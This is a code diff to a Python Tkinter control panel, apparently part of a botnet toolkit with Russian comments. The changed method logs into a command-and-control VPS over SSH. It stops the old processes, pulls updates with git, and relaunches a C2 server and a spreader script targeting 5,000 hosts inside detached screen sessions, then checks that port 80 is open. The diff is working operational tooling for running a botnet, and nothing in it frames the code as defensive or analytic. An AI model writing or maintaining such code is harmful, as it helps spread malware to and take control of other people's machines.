@@ -332,7 +332,7 @@ class BotnetTab(ttk.Frame):
                 self.spread_log.insert(tk.END, f"[!] Ошибка VPS: {e}\n")
         threading.Thread(target=run, daemon=True).start()
 
-    # ----- Обновление VPS (надёжная версия) -----
+    # ----- Обновление VPS (на основе screen) -----
     def update_vps(self):
         if not self.vps_pass:
             self.vps_pass = simpledialog.askstring("VPS пароль", f"Введите пароль для root@{self.c2_host}:", show='*')
@@ -346,8 +346,8 @@ class BotnetTab(ttk.Frame):
                 client.set_missing_host_key_policy(paramiko.AutoAddPolicy())
                 client.connect(self.c2_host, username=self.vps_user, password=self.vps_pass, timeout=10)
 
-                # Остановка старых процессов
-                stop_cmd = "pkill -f botnet/c2.py; pkill -f botnet/spreader.py"
+                # Остановка старых screen-сессий и процессов
+                stop_cmd = "pkill -f botnet/c2.py; pkill -f botnet/spreader.py; screen -S c2 -X quit; screen -S spreader -X quit"
                 client.exec_command(stop_cmd)
 
                 # git pull
@@ -357,13 +357,23 @@ class BotnetTab(ttk.Frame):
                 err = stderr.read().decode()
                 self.spread_log.insert(tk.END, out + "\n" + err + "\n")
 
-                # Запуск с абсолютными путями и nohup
-                start_c2 = "cd /root/c2 && nohup /usr/bin/python3 /root/c2/botnet/c2.py > /root/c2/c2.log 2>&1 &"
-                start_spreader = "cd /root/c2 && nohup /usr/bin/python3 -u /root/c2/botnet/spreader.py --count 5000 >> /root/c2/spreader.log 2>&1 &"
+                # Запуск C2 в screen-сессии
+                start_c2 = "cd /root/c2 && screen -dmS c2 python3 botnet/c2.py"
                 client.exec_command(start_c2)
+                # Запуск спредера в screen-сессии
+                start_spreader = "cd /root/c2 && screen -dmS spreader python3 -u botnet/spreader.py --count 5000"
                 client.exec_command(start_spreader)
 
-                self.spread_log.insert(tk.END, "[+] VPS обновлён и запущен\n")
+                # Небольшая пауза и проверка портов
+                time.sleep(3)
+                check_cmd = "ss -tlnp | grep 80"
+                stdin, stdout, stderr = client.exec_command(check_cmd)
+                port_info = stdout.read().decode()
+                self.spread_log.insert(tk.END, f"Ports:\n{port_info}")
+                if "80" in port_info:
+                    self.spread_log.insert(tk.END, "[+] C2 запущен успешно\n")
+                else:
+                    self.spread_log.insert(tk.END, "[!] Возможно C2 не запустился, проверьте логи на VPS\n")
                 client.close()
             except Exception as e:
                 self.spread_log.insert(tk.END, f"[!] Ошибка обновления VPS: {e}\n")
